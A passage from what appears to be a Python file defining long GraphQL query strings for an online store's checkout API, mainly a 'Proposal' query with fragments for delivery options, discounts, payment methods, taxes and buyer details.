StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

# QUERY_PROPOSAL_DELIVERY
QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment 